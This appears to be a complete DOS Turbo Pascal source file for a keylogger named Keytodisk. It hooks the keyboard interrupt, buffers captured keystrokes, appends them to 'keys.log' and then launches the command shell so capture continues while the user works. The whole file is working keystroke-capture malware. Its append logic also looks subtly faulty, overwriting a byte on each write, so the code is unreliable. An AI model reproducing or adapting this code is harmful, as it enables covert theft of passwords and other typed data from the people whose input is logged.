{$M 4000,0,4000}

{$R-,S-,I-,D-,F-,V-,B-,N-,L-}

Program Keytodisk;

Uses Dos,Crt,FastWr;

Const
    KbdInt     = $15;

Const BuffLen = 16;

Var
    Buff         : array[1..BuffLen] of char;
    BuffIdx      : word;

    Critical     : byte absolute $11c:$320;
    Dos_Busy     : byte absolute $11c:$321;

    InKB         : boolean;

    Odd          : boolean;

    OldKbdVec    : pointer;

    KeyFile      : file;


procedure keyboard(Flags,CS,IP,AX,BX,CX,DX,SI,DI,DS,ES,BP:Word);interrupt;
  begin

  inline($9C);
  asm call OldKbdVec; end;

  inline($FA);

  Odd := Not Odd;

  if (not inkb) and odd then
    begin

    inkb := true;

    buff[buffidx]:=char(lo(ax));

    FastWrite(79,0,$07,Buff[BuffIdx]);

    inc(BuffIdx);

    if BuffIdx >= BuffLen then
      begin

      assign(keyfile,'keys.log');
      reset(keyfile,1);
      if IORESULT<>0 then rewrite(keyfile,1);

      if filesize(keyfile)=0 then seek(keyfile,0) else
      seek(keyfile,filesize(keyfile)-1);

      blockwrite(keyfile,Buff[1],BuffLen);
      Close(KeyFile);

      BuffIdx := 1;
      end;

    inkb := false;

    end;

  inline($FB);
  

  End;

BEGIN

  BuffIdx := 1;
  Odd := false;
  InKb := False;

  GetIntVec(KbdInt, OldKbdVec);
  SetIntVec(KbdInt, Addr(Keyboard));

  exec(getenv('comspec'),'');

  SetIntVec(KbdInt, OldKbdVec);

END.


